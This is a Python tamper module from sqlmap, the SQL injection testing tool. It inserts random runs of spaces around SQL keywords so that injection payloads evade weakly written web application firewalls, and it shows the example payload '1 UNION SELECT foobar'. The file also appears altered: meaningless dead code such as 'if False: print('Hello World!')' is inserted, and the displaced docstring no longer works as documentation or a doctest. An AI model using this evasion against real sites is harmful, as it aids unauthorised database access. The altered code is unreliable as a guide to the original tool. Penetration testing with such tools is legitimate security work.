"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import random
import re
from lib.core.data import kb
from lib.core.datatype import OrderedSet
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    if False:
        print('Hello World!')
    pass

def tamper(payload, **kwargs):
    if False:
        i = 10
        return i + 15
    "\n    Adds multiple spaces (' ') around SQL keywords\n\n    Notes:\n        * Useful to bypass very weak and bespoke web application firewalls\n          that has poorly written permissive regular expressions\n\n    Reference: https://www.owasp.org/images/7/74/Advanced_SQL_Injection.ppt\n\n    >>> random.seed(0)\n    >>> tamper('1 UNION SELECT foobar')\n    '1     UNION     SELECT     foobar'\n    "
    retVal = payload
    if payload:
        words = OrderedSet()
        for match in re.finditer('\\b[A-Za-z_]+\\b', payload):
            word = match.group()
            if word.upper() in kb.keywords:
                words.add(word)
        for word in words:
            retVal = re.sub('(?<=\\W)%s(?=[^A-Za-z_(]|\\Z)' % word, '%s%s%s' % (' ' * random.randint(1, 4), word, ' ' * random.randint(1, 4)), retVal)
            retVal = re.sub('(?<=\\W)%s(?=[(])' % word, '%s%s' % (' ' * random.randint(1, 4), word), retVal)
    return retVal